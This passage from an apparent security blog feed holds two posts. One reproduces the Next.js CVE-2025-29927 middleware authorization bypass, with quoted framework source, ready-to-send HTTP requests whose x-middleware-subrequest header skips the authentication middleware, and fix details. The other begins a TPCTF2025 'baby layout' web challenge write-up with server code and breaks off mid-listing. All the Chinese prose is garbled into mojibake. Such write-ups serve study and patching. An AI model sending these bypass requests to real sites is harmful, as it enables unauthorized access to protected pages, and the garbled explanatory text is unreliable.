language_">this</span>.<span class="title function_">hasPage</span>(params.<span class="property">parsedUrl</span>.<span class="property">pathname</span>)) &#123;</span><br><span class="line">      page.<span class="property">name</span> = params.<span class="property">parsedUrl</span>.<span class="property">pathname</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">dynamicRoutes</span>) &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> dynamicRoute <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">dynamicRoutes</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> matchParams = dynamicRoute.<span class="title function_">match</span>(params.<span class="property">parsedUrl</span>.<span class="property">pathname</span>)</span><br><span class="line">        <span class="keyword">if</span> (matchParams) &#123;</span><br><span class="line">          page.<span class="property">name</span> = dynamicRoute.<span class="property">page</span></span><br><span class="line">          page.<span class="property">params</span> = matchParams</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> subreq = params.<span class="property">request</span>.<span class="property">headers</span>[<span class="string">`x-middleware-subrequest`</span>]</span><br><span class="line">    <span class="keyword">const</span> subrequests = <span class="keyword">typeof</span> subreq === <span class="string">&#x27;string&#x27;</span> ? subreq.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>) : []</span><br><span class="line">    <span class="keyword">const</span> allHeaders = <span class="keyword">new</span> <span class="title class_">Headers</span>()</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">result</span>: <span class="title class_">FetchEventResult</span> | <span class="literal">null</span> = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> middleware <span class="keyword">of</span> <span class="variable language_">this</span>.<span class="property">middleware</span> || []) &#123;</span><br><span class="line">      <span class="keyword">if</span> (middleware.<span class="title function_">match</span>(params.<span class="property">parsedUrl</span>.<span class="property">pathname</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">hasMiddleware</span>(middleware.<span class="property">page</span>, middleware.<span class="property">ssr</span>))) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">`The Edge Function for <span class="subst">$&#123;middleware.page&#125;</span> was not found`</span>)</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">ensureMiddleware</span>(middleware.<span class="property">page</span>, middleware.<span class="property">ssr</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> middlewareInfo = <span class="title function_">getMiddlewareInfo</span>(&#123;</span><br><span class="line">          <span class="attr">dev</span>: <span class="variable language_">this</span>.<span class="property">renderOpts</span>.<span class="property">dev</span>,</span><br><span class="line">          <span class="attr">distDir</span>: <span class="variable language_">this</span>.<span class="property">distDir</span>,</span><br><span class="line">          <span class="attr">page</span>: middleware.<span class="property">page</span>,</span><br><span class="line">          <span class="attr">serverless</span>: <span class="variable language_">this</span>.<span class="property">_isLikeServerless</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (subrequests.<span class="title function_">includes</span>(middlewareInfo.<span class="property">name</span>)) &#123;</span><br><span class="line">          result = &#123;</span><br><span class="line">            <span class="attr">response</span>: <span class="title class_">NextResponse</span>.<span class="title function_">next</span>(),</span><br><span class="line">            <span class="attr">waitUntil</span>: <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        result = <span class="keyword">await</span> <span class="title function_">run</span>(&#123;</span><br><span class="line">          <span class="attr">name</span>: middlewareInfo.<span class="property">name</span>,</span><br><span class="line">          <span class="attr">paths</span>: middlewareInfo.<span class="property">paths</span>,</span><br><span class="line">          <span class="attr">request</span>: &#123;</span><br><span class="line">            <span class="attr">headers</span>: params.<span class="property">request</span>.<span class="property">headers</span>,</span><br><span class="line">            <span class="attr">method</span>: params.<span class="property">request</span>.<span class="property">method</span> || <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">            <span class="attr">nextConfig</span>: &#123;</span><br><span class="line">              <span class="attr">basePath</span>: <span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">basePath</span>,</span><br><span class="line">              <span class="attr">i18n</span>: <span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">i18n</span>,</span><br><span class="line">              <span class="attr">trailingSlash</span>: <span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">trailingSlash</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">url</span>: (params.<span class="property">request</span> <span class="keyword">as</span> <span class="built_in">any</span>).<span class="property">__NEXT_INIT_URL</span>,</span><br><span class="line">            <span class="attr">page</span>: page,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">ssr</span>: !!<span class="variable language_">this</span>.<span class="property">nextConfig</span>.<span class="property">experimental</span>.<span class="property">concurrentFeatures</span>,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> result.<span class="property">response</span>.<span class="property">headers</span>) &#123;</span><br><span class="line">          allHeaders.<span class="title function_">append</span>(key, value)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">renderOpts</span>.<span class="property">dev</span>) &#123;</span><br><span class="line">          result.<span class="property">waitUntil</span>.<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Uncaught: middleware waitUntil errored`</span>, error)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!result.<span class="property">response</span>.<span class="property">headers</span>.<span class="title function_">has</span>(<span class="string">&#x27;x-middleware-next&#x27;</span>)) &#123;</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!result) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">render404</span>(params.<span class="property">request</span>, params.<span class="property">response</span>, params.<span class="property">parsed</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> [key, value] <span class="keyword">of</span> allHeaders) &#123;</span><br><span class="line">        result.<span class="property">response</span>.<span class="property">headers</span>.<span class="title function_">set</span>(key, value)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (subrequests.<span class="title function_">includes</span>(middlewareInfo.<span class="property">name</span>)) &#123;</span><br><span class="line">      result = &#123;</span><br><span class="line">        <span class="attr">response</span>: <span class="title class_">NextResponse</span>.<span class="title function_">next</span>(),</span><br><span class="line">        <span class="attr">waitUntil</span>: <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">continue</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœsubrequestsæ•°ç»„ä¸­åŒ…å«middlewareInfo.nameï¼Œé‚£ä¹ˆè¿™ä¸ªä¸­é—´ä»¶ç›´æ¥è·³è¿‡ï¼Œè¿”å›NextResponse.next()ï¼Œè¯·æ±‚ä¼šç»§ç»­å‰è¿›ï¼Œå®Œå…¨ç»•è¿‡è¯¥ä¸­é—´ä»¶çš„æ‰§è¡Œã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬çš„ç»•è¿‡æ€è·¯å°±æ˜¯è®©x-middleware-subrequestè¯·æ±‚å¤´åŒ…å«ä¸­é—´ä»¶çš„åç§°ï¼Œä»è€Œæ¬ºéª—runMiddlewareè®¤ä¸ºè¯¥ä¸­é—´ä»¶å·²ç»æ‰§è¡Œè¿‡ï¼Œå¯¼è‡´å…¶è¢«è·³è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard/team/admin HTTP/1.1</span><br><span class="line">Host: example.com</span><br><span class="line">x-middleware-subrequest: pages/_middleware</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦çŸ¥é“çš„æ˜¯ä¸­é—´ä»¶çš„åç§°ï¼Œåªè¦æœ‰äº†ä¸­é—´ä»¶çš„åç§°é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®ç°é‰´æƒç»•è¿‡äº†ã€‚</p><p>é¦–å…ˆä¸­é—´ä»¶å¿…é¡»å‘½åä¸º <code> _middleware.ts</code></p><p>å¿…é¡»ä½äº pages&#x2F; ç›®å½•æˆ–å…¶å­ç›®å½•ä¸‹ï¼ˆå› ä¸º App Router åœ¨ 13 ç‰ˆæœ¬æ‰æ¨å‡ºï¼‰</p><p>å› æ­¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x-middleware-subrequest: pages/_middleware</span><br></pre></td></tr></table></figure><p>è‹¥ä¸­é—´ä»¶ä½äº <code>/pages/dashboard/_middleware.ts</code>ï¼Œåˆ™ <code>middlewareInfo.name</code> ä¸º <code>pages/dashboard/_middleware</code>ï¼Œæ”»å‡»è€…åªéœ€åœ¨è¯·æ±‚å¤´ä¸­è®¾ç½® <code>x-middleware-subrequest: pages/dashboard/_middleware</code> å³å¯ç»•è¿‡ã€‚</p><h3 id="æ–°ç‰ˆæœ¬ï¼ˆv-12-2ï¼‰"><a href="#æ–°ç‰ˆæœ¬ï¼ˆv-12-2ï¼‰" class="headerlink" title="æ–°ç‰ˆæœ¬ï¼ˆv&gt;&#x3D;12.2ï¼‰"></a>æ–°ç‰ˆæœ¬ï¼ˆv&gt;&#x3D;12.2ï¼‰</h3><p>æ–°ç‰ˆæœ¬å…¶å®å°±æ˜¯æˆ‘ä»¬åœ¨æ¼æ´åˆ†æä¸­æ‰€è¯´çš„ï¼š</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> run = <span class="title function_">withTaggedErrors</span>(<span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">runWithTaggedErrors</span>(<span class="params">params</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> runtime = <span class="keyword">await</span> <span class="title function_">getRuntimeContext</span>(params)</span><br><span class="line">  <span class="keyword">const</span> subreq = params.<span class="property">request</span>.<span class="property">headers</span>[<span class="string">`x-middleware-subrequest`</span>]</span><br><span class="line">  <span class="keyword">const</span> subrequests = <span class="keyword">typeof</span> subreq === <span class="string">&#x27;string&#x27;</span> ? subreq.<span class="title function_">split</span>(<span class="string">&#x27;:&#x27;</span>) : []</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">MAX_RECURSION_DEPTH</span> = <span class="number">5</span></span><br><span class="line">  <span class="keyword">const</span> depth = subrequests.<span class="title function_">reduce</span>(</span><br><span class="line">    <span class="function">(<span class="params">acc, curr</span>) =&gt;</span> (curr === params.<span class="property">name</span> ? acc + <span class="number">1</span> : acc),</span><br><span class="line">    <span class="number">0</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (depth &gt;= <span class="variable constant_">MAX_RECURSION_DEPTH</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">waitUntil</span>: <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(),</span><br><span class="line">      <span class="attr">response</span>: <span class="keyword">new</span> runtime.<span class="property">context</span>.<span class="title class_">Response</span>(<span class="literal">null</span>, &#123;</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="string">&#x27;x-middleware-next&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;),</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆç›®å‰å°±æ˜¯å¯»æ‰¾ä¸­é—´ä»¶åç§°äº†ï¼Œè€Œåœ¨é«˜ç‰ˆæœ¬ï¼Œå¯¹ä¸­é—´ä»¶çš„æ–‡ä»¶åˆè¦äº†è¦æ±‚ï¼Œä¸­é—´ä»¶æ–‡ä»¶æ›´åä¸º <code>middleware.ts</code>ï¼Œä½äº <code>src/</code> æˆ–æ ¹ç›®å½•ã€‚æ­¤æ—¶ï¼Œæ”»å‡»è€…åªéœ€è®¾ç½® <code>x-middleware-subrequest: middleware</code> æˆ– <code>x-middleware-subrequest: src/middleware</code> å³å¯ç»•è¿‡ã€‚</p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§ Next.js ç‰ˆæœ¬</p><blockquote><ul><li>â‰¥15.2.3ï¼ˆ15.xï¼‰</li><li>â‰¥14.2.25ï¼ˆ14.xï¼‰</li></ul></blockquote><p>ç›´æ¥çœ‹githubä¸Šçš„å®˜æ–¹çš„commit</p><p><a href="https://github.com/vercel/next.js/commit/9704c8e9fcc58236349ed787903831579440a879">https://github.com/vercel/next.js/commit/9704c8e9fcc58236349ed787903831579440a879</a></p><img src="/2025/03/31/Next-js%E4%B8%AD%E9%97%B4%E4%BB%B6%E9%89%B4%E6%9D%83%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2025-29927/image-20250331153719392.png" class="" title="This is an example image"><p>å®˜æ–¹ä¿®å¤å°±æ˜¯ç›´æ¥åˆ æ‰x-middleware-subrequestè¯·æ±‚å¤´</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://govuln.com/topic/">https://govuln.com/topic/</a></p><p><a href="https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware">https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware</a></p><p><a href="https://xz.aliyun.com/news/17406?time__1311=eqUxn7DQG=eqBDBdPdK0QOGQNPY5q63x&u_atoken=61d9e3cacb71fd68c52f2ec066d76aa9&u_asig=1a0c380917433328356222442e009d">https://xz.aliyun.com/news/17406?time__1311=eqUxn7DQG%3DeqBDBdPdK0QOGQNPY5q63x&amp;u_atoken=61d9e3cacb71fd68c52f2ec066d76aa9&amp;u_asig=1a0c380917433328356222442e009d</a></p><p><a href="https://xz.aliyun.com/news/17403?u_atoken=7a1e484af2e2cf99ecceeef1933abf0b&u_asig=1a0c380917433328366722478e009d">https://xz.aliyun.com/news/17403?u_atoken=7a1e484af2e2cf99ecceeef1933abf0b&amp;u_asig=1a0c380917433328366722478e009d</a></p><p><a href="https://forum.butian.net/article/679">https://forum.butian.net/article/679</a></p>]]></content>
      
      
      <categories>
          
          <category> CVEå¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVEå¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TPCTF2025 wp</title>
      <link href="/2025/03/30/TPCTF2025-wp/"/>
      <url>/2025/03/30/TPCTF2025-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="baby-layout"><a href="#baby-layout" class="headerlink" title="baby layout"></a>baby layout</h2><p>webï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> express <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> session <span class="keyword">from</span> <span class="string">&#x27;express-session&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> rateLimit <span class="keyword">from</span> <span class="string">&#x27;express-rate-limit&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; randomBytes &#125; <span class="keyword">from</span> <span class="string">&#x27;crypto&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> createDOMPurify <span class="keyword">from</span> <span class="string">&#x27;dompurify&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="variable constant_">JSDOM</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;jsdom&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123; <span class="variable language_">window</span> &#125; = <span class="keyword">new</span> <span class="title function_">JSDOM</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">DOMPurify</span> = <span class="title function_">createDOMPurify</span>(<span class="variable language_">window</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> posts = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">DEFAULT_LAYOUT</span> = <span class="string">`</span></span><br><span class="line"><span class="string">&lt;article&gt;</span></span><br><span class="line"><span class="string">  &lt;h1&gt;Blog Post&lt;/h1&gt;</span></span><br><span class="line"><span class="string">  &lt;div&gt;&#123;&#123;content&#125;&#125;&lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/article&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">LENGTH_LIMIT</span> = <span class="number">500</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (process.<span class="property">env</span>.<span class="property">NODE_ENV</span> === <span class="string">&#x27;production&#x27;</span>) &#123;</span><br><span class="line">  app.<span class="title function_">use</span>(</span><br><span class="line">    <span class="string">&#x27;/api&#x27;</span>,</span><br><span class="line">    <span class="title function_">rateLimit</span>(&#123;</span><br><span class="line">      <span class="attr">windowMs</span>: <span class="number">60</span> * <span class="number">1000</span>,</span><br><span class="line">      <span class="attr">max</span>: <span class="number">10</span>,</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">  <span class="attr">secret</span>: <span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>),</span><br><span class="line">  <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">saveUninitialized</span>: <span class="literal">false</span>,</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">req, _, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">layouts</span>) &#123;</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">layouts</span> = [<span class="variable constant_">DEFAULT_LAYOUT</span>];</span><br><span class="line">    req.<span class="property">session</span>.<span class="property">posts</span> = [];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">setHeader</span>(<span class="string">&#x27;Cache-Control&#x27;</span>, <span class="string">&#x27;no-store&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;home&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">posts</span>: req.<span class="property">session</span>.<span class="property">posts</span>,</span><br><span class="line">    <span class="attr">maxLayout</span>: req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="property">length</span> - <span class="number">1</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/post&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; content, layoutId &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> content !== <span class="string">&#x27;string&#x27;</span> || <span class="keyword">typeof</span> layoutId !== <span class="string">&#x27;number&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid params&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (content.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Content too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> layout = req.<span class="property">session</span>.<span class="property">layouts</span>[layoutId];</span><br><span class="line">  <span class="keyword">if</span> (layout === <span class="literal">undefined</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Layout not found&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sanitizedContent = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content);</span><br><span class="line">  <span class="keyword">const</span> body = layout.<span class="title function_">replace</span>(<span class="regexp">/\&#123;\&#123;content\&#125;\&#125;/g</span>, <span class="function">() =&gt;</span> sanitizedContent);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (body.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Post too long&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = <span class="title function_">randomBytes</span>(<span class="number">16</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  posts.<span class="title function_">set</span>(id, body);</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">posts</span>.<span class="title function_">push</span>(id);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Post <span class="subst">$&#123;id&#125;</span> <span class="subst">$&#123;Buffer.<span class="keyword">from</span>(layout).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span> <span class="subst">$&#123;Buffer.<span class="keyword">from</span>(sanitizedContent).toString(<span class="string">&#x27;base64&#x27;</span>)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/layout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; layout &#125; = req.<span class="property">body</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> layout !== <span class="string">&#x27;string&#x27;</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid param&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (layout.<span class="property">length</span> &gt; <span class="variable constant_">LENGTH_LIMIT</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">&#x27;Layout too large&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sanitizedLayout = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(layout);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> id = req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="property">length</span>;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">layouts</span>.<span class="title function_">push</span>(sanitizedLayout);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123; id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/post/:id&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; id &#125; = req.<span class="property">params</span>;</span><br><span class="line">  <span class="keyword">const</span> body = posts.<span class="title function_">get</span>(id);</span><br><span class="line">  <span class="keyword">if</span> (body === <span class="literal">undefined</span>) <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&#x27;Post not found&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;post&#x27;</span>, &#123; id, body &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/api/clear&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">layouts</span> = [<span class="variable constant_">DEFAULT_LAYOUT</span>];</span><br><span class="line">  req.<span class="property">session</span>.<span class="property">posts</span> = [];</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">&#x27;cleared&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Web server running on port 